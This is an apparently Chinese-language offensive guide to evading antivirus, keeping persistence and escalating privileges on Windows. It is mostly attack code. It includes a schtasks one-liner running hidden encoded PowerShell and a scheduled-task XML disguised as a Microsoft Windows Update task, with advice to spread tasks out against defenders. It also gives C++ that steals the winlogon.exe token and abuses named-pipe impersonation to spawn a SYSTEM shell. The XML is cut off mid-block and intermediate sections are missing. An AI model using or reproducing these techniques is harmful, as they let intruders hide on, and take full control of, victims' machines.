## 一、免杀持久化机制

### 1.1 计划任务混淆持久化
```powershell
# 基础：每日执行
schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -w hidden -enc <base64>" /sc daily /st 09:00 /f

# 高级：XML导入（高度混淆）
$xml = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Update Service</Description>
    <URI>\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled><Delay>PT5M</Delay></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>

# 持续对抗：将计划任务分散到多个任务
```

## 五、令牌窃取与权限提升

### 5.1 提权到SYSTEM
```cpp
// 1. 找到SYSTEM权限进程（如 winlogon.exe）
DWORD pid = FindProcessPID("winlogon.exe");

// 2. 打开进程获取令牌
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);

// 3. 复制令牌
HANDLE hDupToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);

// 4. 以SYSTEM启动新进程
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
```

### 5.2 命名管道模拟
```cpp
// 1. 创建命名管道
HANDLE hPipe = CreateNamedPipe("\\\\.\\pipe\\fake_pipe",
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);

// 2. 等待SYSTEM权限客户端连接
ConnectNamedPipe(hPipe, NULL);

// 3. 模拟客户端令牌
ImpersonateNamedPipeClient(hPipe);

// 4. 获取模拟令牌并提升
HANDLE hToken;
OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

// 5. 创建SYSTEM进程
CreateProcessWithTokenW(hToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
```
